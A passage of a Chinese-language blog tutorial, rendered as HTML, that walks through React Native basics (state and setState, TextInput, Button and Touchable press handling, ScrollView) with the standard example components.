&lt;View style=&#123;&#123;alignItems: 'center'&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Greeting name='Rexxar' /</span>&gt;</span><br><span class=\"line\">        &lt;Greeting name=<span class=\"string\">'Jaina'</span> /&gt;</span><br><span class=\"line\">        &lt;Greeting name=<span class=\"string\">'Valeera'</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"RN中的State\"><a href=\"#RN中的State\" class=\"headerlink\" title=\"RN中的State\"></a>RN中的State</h2><p>一般来说，你需要在class中声明一个<code>state</code>对象，然后在需要修改时调用<code>setState</code>方法。</p>\n<p>假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个<code>prop</code>。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到<code>state</code>中。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Blink</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明state对象</span></span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isShowingText</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 每1000毫秒对showText状态做一次取反操作</span></span><br><span class=\"line\">    setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        isShowingText: !<span class=\"keyword\">this</span>.state.isShowingText</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 根据当前showText的值决定是否显示text内容</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.state.isShowingText) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Text&gt;&#123;<span class=\"keyword\">this</span>.props.text&#125;&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default class BlinkApp extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Blink text='I love to blink' /</span>&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Yes blinking is so great'</span> /&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Why did they ever take this out of HTML'</span> /&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Look at me look at me look at me'</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如<a href=\"http://redux.js.org/index.html\" target=\"_blank\" rel=\"noopener\">Redux</a>来统一管理数据流。</p>\n<ul>\n<li>一切界面变化都是<code>状态state变化</code></li>\n<li><code>state</code>的修改必须通过<code>setState()</code>方法<ul>\n<li>this.state.likes = 100; // 这样的<code>直接赋值修改无效！</code></li>\n<li>setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性</li>\n<li>setState 是<code>异步</code>操作，修改<code>不会马上生效</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"处理文本输入\"><a href=\"#处理文本输入\" class=\"headerlink\" title=\"处理文本输入\"></a>处理文本输入</h2><p><a href=\"https://reactnative.cn/docs/textinput#content\" target=\"_blank\" rel=\"noopener\"><code>TextInput</code></a>是一个允许用户输入文本的基础组件。</p>\n<p>它有一个名为<code>onChangeText</code>的属性，此属性接受一个函数，而此函数会在文本变化时被调用。</p>\n<p>另外还有一个名为<code>onSubmitEditing</code>的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">/** 处理文本输入</span></span><br><span class=\"line\"><span class=\"comment\"> \t每输入一个单词就得到一块 🍕 */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PizzaTranslator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> [text, setText] = useState(<span class=\"string\">''</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View style=&#123;&#123;<span class=\"attr\">padding</span>: <span class=\"number\">10</span>&#125;&#125;&gt;</span><br><span class=\"line\">      &lt;TextInput</span><br><span class=\"line\">        style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">40</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'#ccc'</span>&#125;&#125;</span><br><span class=\"line\">        placeholder=<span class=\"string\">\"Type here to translate!\"</span></span><br><span class=\"line\">        onChangeText=&#123;text =&gt; setText(text)&#125;</span><br><span class=\"line\">        defaultValue=&#123;text&#125;</span><br><span class=\"line\">      /&gt;</span><br><span class=\"line\">      &lt;Text style=&#123;&#123;<span class=\"attr\">padding</span>: <span class=\"number\">10</span>, <span class=\"attr\">fontSize</span>: <span class=\"number\">42</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &#123;text.split(<span class=\"string\">' '</span>).map(<span class=\"function\">(<span class=\"params\">word</span>) =&gt;</span> word &amp;&amp; <span class=\"string\">'🍕'</span>).join(<span class=\"string\">' '</span>)&#125;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>View&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327083821128.png\" alt=\"image-20200327083821128\" style=\"zoom:50%;\"></p>\n<h2 id=\"处理触摸事件\"><a href=\"#处理触摸事件\" class=\"headerlink\" title=\"处理触摸事件\"></a>处理触摸事件</h2><h3 id=\"onPress-事件\"><a href=\"#onPress-事件\" class=\"headerlink\" title=\"onPress 事件\"></a>onPress 事件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Button</span><br><span class=\"line\">  onPress=&#123;() =&gt; &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">\"你点击了按钮！\"</span>);</span><br><span class=\"line\">  &#125;&#125;</span><br><span class=\"line\">  title=<span class=\"string\">\"点我！\"</span></span><br><span class=\"line\">/&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327084507790.png\" alt=\"image-20200327084507790\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  _onPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You tapped the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      buttonContainer: &#123;</span><br><span class=\"line\">        margin: <span class=\"number\">20</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      alternativeLayoutButtonContainer: &#123;</span><br><span class=\"line\">        margin: <span class=\"number\">20</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'row'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'space-between'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span><br><span class=\"line\">          &lt;Button</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            title=<span class=\"string\">\"Press Me\"</span></span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            title=\"Press Me\"</span></span><br><span class=\"line\"><span class=\"regexp\">            color=\"#841584\"</span></span><br><span class=\"line\"><span class=\"regexp\">          /</span>&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;View style=&#123;styles.alternativeLayoutButtonContainer&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            title=\"This looks great!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          /</span>&gt;</span><br><span class=\"line\">          &lt;Button</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            title=<span class=\"string\">\"OK!\"</span></span><br><span class=\"line\">            color=<span class=\"string\">\"#841584\"</span></span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327085101363.png\" alt=\"image-20200327085101363\" style=\"zoom:50%;\"></p>\n<h3 id=\"Touchable-系列组件\"><a href=\"#Touchable-系列组件\" class=\"headerlink\" title=\"Touchable 系列组件\"></a>Touchable 系列组件</h3><ul>\n<li>一般来说，你可以使用<a href=\"https://reactnative.cn/docs/touchablehighlight\" target=\"_blank\" rel=\"noopener\"><strong>TouchableHighlight</strong></a>来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。</li>\n<li>在 Android 上还可以使用<a href=\"https://reactnative.cn/docs/touchablenativefeedback\" target=\"_blank\" rel=\"noopener\"><strong>TouchableNativeFeedback</strong></a>，它会在用户手指按下时形成类似墨水涟漪的视觉效果。</li>\n<li><a href=\"https://reactnative.cn/docs/touchableopacity\" target=\"_blank\" rel=\"noopener\"><strong>TouchableOpacity</strong></a>会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。</li>\n<li>如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用<a href=\"https://reactnative.cn/docs/touchablewithoutfeedback\" target=\"_blank\" rel=\"noopener\"><strong>TouchableWithoutFeedback</strong></a>。</li>\n</ul>\n<ul>\n<li>检测用户是否进行了长按，组件中使用<code>onLongPress</code>属性来实现。</li>\n</ul>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  _onPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You tapped the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  _onLongPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You long-pressed the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">        paddingTop: <span class=\"number\">60</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'center'</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      button: &#123;</span><br><span class=\"line\">        marginBottom: <span class=\"number\">30</span>,</span><br><span class=\"line\">        width: <span class=\"number\">260</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        backgroundColor: <span class=\"string\">'#2196F3'</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      buttonText: &#123;</span><br><span class=\"line\">        textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        padding: <span class=\"number\">20</span>,</span><br><span class=\"line\">        fontSize: <span class=\"number\">16</span>,</span><br><span class=\"line\">        color: <span class=\"string\">'#fff'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* 组件的背景会在用户手指按下时变暗。 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableHighlight onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125; underlayColor=<span class=\"string\">\"white\"</span>&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableHighlight&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableHighlight&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &#123;/</span>* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;TouchableOpacity onPress=&#123;this._onPressButton&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableOpacity&lt;/</span>Text&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>TouchableOpacity&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableNativeFeedback</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            background=&#123;Platform.OS === <span class=\"string\">'android'</span> ? TouchableNativeFeedback.SelectableBackground() : <span class=\"string\">''</span>&#125;&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableNativeFeedback&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableNativeFeedback&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &#123;/</span>* 不显示任何视觉反馈 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;TouchableWithoutFeedback</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            &gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableWithoutFeedback&lt;/</span>Text&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>TouchableWithoutFeedback&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* 绑定单击 和 长按事件 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableHighlight onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125; onLongPress=&#123;<span class=\"keyword\">this</span>._onLongPressButton&#125; underlayColor=<span class=\"string\">\"white\"</span>&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;Touchable <span class=\"keyword\">with</span> Long Press&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableHighlight&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"滚动视图\"><a href=\"#滚动视图\" class=\"headerlink\" title=\"滚动视图\"></a>滚动视图</h2><p><a href=\"https://reactnative.cn/docs/scrollview\" target=\"_blank\" rel=\"noopener\"><code>ScrollView</code></a>是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过<code>horizontal</code>属性来设置）。</p>\n<p>下面的示例代码创建了一个垂直滚动的<code>ScrollView</code>，其中还混杂了图片和文字组件。</p>\n<p><img src=\"/view/posts/e61ae078/ScrollView.gif\" alt=\"ScrollView\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;ScrollView style=&#123;&#123;<span class=\"attr\">backgroundColor</span>: <span class=\"string\">'#df02d0'</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;&#123;<span class=\"attr\">fontSize</span>:<span class=\"number\">48</span>&#125;&#125;&gt;Scroll me plz&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Image source=&#123;require('./</span><span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;If you like&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        